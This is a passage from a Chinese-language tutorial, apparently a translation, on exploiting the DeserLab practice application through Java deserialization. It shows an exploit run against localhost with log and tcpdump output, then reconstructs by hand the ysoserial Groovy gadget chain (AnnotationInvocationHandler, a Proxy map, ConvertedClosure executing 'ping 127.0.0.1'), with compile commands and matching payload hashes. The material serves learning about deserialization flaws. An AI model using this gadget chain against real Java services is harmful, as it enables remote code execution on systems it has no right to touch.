    ./deserlab_exploit.py 127.0.0.1 6666 payload_ping_localhost.bin 
    2017-09-07 22:58:05,401 - INFO - Connecting
    2017-09-07 22:58:05,401 - INFO - java serialization handshake
    2017-09-07 22:58:05,403 - INFO - protocol specific handshake
    2017-09-07 22:58:05,492 - INFO - protocol specific version handshake
    2017-09-07 22:58:05,571 - INFO - sending name of connected client
    2017-09-07 22:58:05,571 - INFO - exploiting
如果一切顺利的话，你可以看到如下输出：
    sudo tcpdump -i lo icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
    22:58:06.215178 IP localhost > localhost: ICMP echo request, id 31636, seq 1, length 64
    22:58:06.215187 IP localhost > localhost: ICMP echo reply, id 31636, seq 1, length 64
    22:58:07.215374 IP localhost > localhost: ICMP echo request, id 31636, seq 2, length 64
非常好，我们成功利用了DeserLab的漏洞。接下来我们需要好好理解一下我们发往DeserLab的载荷的具体内容。
**  
**
**三、手动构建载荷**
想要理解载荷的工作原理，最好的方法就是自己手动重建一模一样的载荷，也就是说，我们需要写Java代码。问题是，我们需要从何处开始？正如我们前面对pcap的分析一样，我们可以观察一下序列化载荷。使用如下这条命令，我们可以将载荷转换为十六进制字符串，然后我们就可以使用SerializationDumper来分析这个字符串，当然如果你喜欢的话，你也可以使用jdeserialize来分析文件。
    open('payload.bin','rb').read().encode('hex
现在我们可以深入分析一下，理解具体的工作过程。话说回来，当理清这些问题后，你可能会找到另一篇文章详细介绍了整个过程，所以如果愿意的话，你可以跳过
这部分内容，直接阅读这篇[文章](https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical)。接下来的文章着重介绍了我所使用的方法。在我使用的方法中，非常重要的一点就是阅读ysoserial中关于这个漏洞利用部分的源码。我不想重复提及这一点，如果你纳闷我怎么找到具体的工作流程，我会让你去阅读ysoserial的实现代码。
将载荷传给工具处理后，这两个工具都会生成非常长的输出信息，包含各种Java类代码。其中我们主要关注的类是输出信息中的第一个类，名为“sun.reflect.annotation.AnnotationInvocationHandler”。这个类看起来非常眼熟，因为它是许多反序列利用代码的入口点。我还注意到其他一些信息，包括“java.lang.reflect.Proxy”、“org.codehaus.groovy.runtime.ConvertedClosure”以及“org.codehaus.groovy.runtime.MethodClosure”。这些类之所以引起我的注意，原因在于它们引用了我们用来利用漏洞的程序库，此外，网上关于Java反序列化漏洞利用的文章中也提到过这些类，我在ysoserial源码中也见过这些类。
我们需要注意一个重要概念，那就是当你在执行反序列化攻击操作时，你发送的实际上是某个对象的“已保存的”状态。也就是说，你完全依赖于接收端的行为模式，更具体地说，你依赖于接收端在反序列化你发送的“已保存的”状态时所执行的具体操作。如果另一端没有调用你所发送的对象中的任何方法，你就无法达到远程代码执行目的。这意味着你唯一能改变的只是操作对象的属性信息。
理清这些概念后我们可知，如果我们想获得代码执行效果，我们所发送的第一个类中的某个方法需要被自动调用，这也解释了为什么第一个类的地位如此重要。如果我们观察[AnnotationInvocationHandler](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b27/sun/reflect/annotation/AnnotationInvocationHandler.java)的代码，我们可以看到其构造函数接受一个java.util.map对象，且readObject方法会调用Map对象上的一个方法。如果你阅读过其他文章，那么你就会知道，当数据流被反序列化时会自动调用readObject方法。基于这些信息，再从其他文章来源借鉴部分代码，我们就可以着手构建自己的漏洞利用代码，如下所示。如果你想理解代码内容，你可以先参考一下Java中的[反射（reflection）](https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful)机制。
     //this is the first class that will be deserialized
     String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
     //access the constructor of the AnnotationInvocationHandler class
     final Constructor constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
     //normally the constructor is not accessible, so we need to make it accessible
     constructor.setAccessible(true);
你可以使用如下命令来编译并运行这段代码，虽然目前它还没有什么实际功能：
    javac ManualPayloadGenerateBlog
    java ManualPayloadGenerateBlog
当你拓展这段代码的功能时，请牢记以下几点：
**碰到错误代码时请及时Google。**
**类名需与文件名保持一致。**
**请熟练掌握Java语言。**
上述代码可以提供可用的初始入口点类以及构造函数，但我们具体需要往构造函数中传递什么参数呢？大多数例子中会使用如下这行代码：
    constructor.newInstance(Override.class, map);
对于“map”参数我的理解是，首次调用readObject期间会调用map对象的“entrySet”方法。我不是特别明白第一个参数的内部工作机制，但我知道readObject方法内部会检查这个参数，以确认该参数为“AnnotionType”类型。我们为该参数提供了一个“Override”类，可以满足类型要求。
现在说到重点了。为了理解程序的工作原理，我们需要注意的是，第二个参数不是一个简单的Java
map对象，而是一个Java代理（Proxy）对象。我第一次接触到这个事实时也不明白这有什么具体含义。有一篇[文章](http://www.baeldung.com/java-dynamic-proxies)详细介绍了Java动态代理（Dynamic Proxies）机制的相关内容，也提供了非常好的示例代码。文章部分内容摘抄如下：
“
通过动态代理机制，仅包含1个方法的单一类可以使用多个调用接口为包含任意多个方法的任意类提供服务。动态代理的作用与封装（Facade）层类似，但你可以把它当成是任意接口的具体实现。抛去外表后，你会发现动态代理会把所有的方法调用导向单独的一个处理程序，即invoke()方法。
”
简单理解的话，代理对象可以假装成一个Java map对象，然后将所有对原始Map对象的调用导向对另一个类的某个方法的调用。让我们用一张图来梳理一下：
这意味着我们可以使用这种Map对象来拓展我们的代码，如下所示：
    final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] {Map.class}, );
需要注意的是，我们仍然需要匹配代码中的invocationhandler，现在我们还没填充这个位置。这个位置最终由Groovy来填充，目前为止我们仍停留在普通的Java类范围内。Groovy之所以适合这个位置，原因在于它包含一个InvocationHandler。因此，当InvocationHandler被调用时，程序最终会引导我们达到代码执行效果，如下所示：
    final ConvertedClosure closure = new ConvertedClosure(new MethodClosure("ping 127.0.0.1", "execute"), "entrySet");
    final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] {Map.class}, closure);
如你所见，上面代码中我们在invocationhandler填入了一个ConvertedClosure对象。你可以反编译Groovy库来确认这一点，当你观察ConvertedClosure类时，你可以看到它继承（extends
）自ConversionHandler类，反编译这个类，你可以看到如下代码：
    public abstract class ConversionHandler
     implements InvocationHandler, Serializable
从代码中我们可知，ConversionHandler实现了InvocationHandler，这也是为什么我们可以在代理对象中使用它的原因所在。当时我不能理解的是Groovy载荷如何通过Map代理来实现代码执行。你可以使用反编译器来查看Groovy库的代码，但通常情况下，我发现使用Google来搜索关键信息更为有效。比如说，这种情况下，我们可以在Google中搜索如下关键词：
    “groovy execute shell command”
搜索上述关键词后，我们可以找到许多文章来解释这个问题，比如这篇[文章](https://stackoverflow.com/questions/159148/groovy-executing-shell-commands)以及这篇[文章](https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy)。这些解释的要点在于，String对象有一个名为“execute”的附加方法。我经常使用这种查询方法来处理我不熟悉的那些环境，因为对开发者而言，执行shell命令通常是一个刚需，而相关答案又经常可以在互联网上找到。理解这一点后，我们可以使用一张图来完整表达载荷的工作原理，如下所示：
你可以访问[此链接](https://gist.github.com/DiabloHorn/44d91d3cbefa425b783a6849f23b8aa7)获取完整版代码，然后使用如下命令编译并运行这段代码：
    javac -cp DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate.java 
    java -cp .:DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate > payload_manual.bin
运行这段代码后，我们应该能够得到与ysoserial载荷一样的结果。令我感到惊奇的是，这些载荷的哈希值竟然完全一样。
    sha256sum payload_ping_localhost.bin payload_manual.bin 
    4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_ping_localhost.bin
    4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_manual.bin
感谢大家阅读本文，希望以后在利用Java反序列化漏洞的过程中，大家也能更好地理解漏洞利用原理。
**  
**
**四、参考资料**
https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical
https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html
http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
https://www.youtube.com/watch?v=VviY3O-euVQ
http://wouter.coekaerts.be/2015/annotationinvocationhandler
http://www.baeldung.com/java-dynamic-proxies
https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy
https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful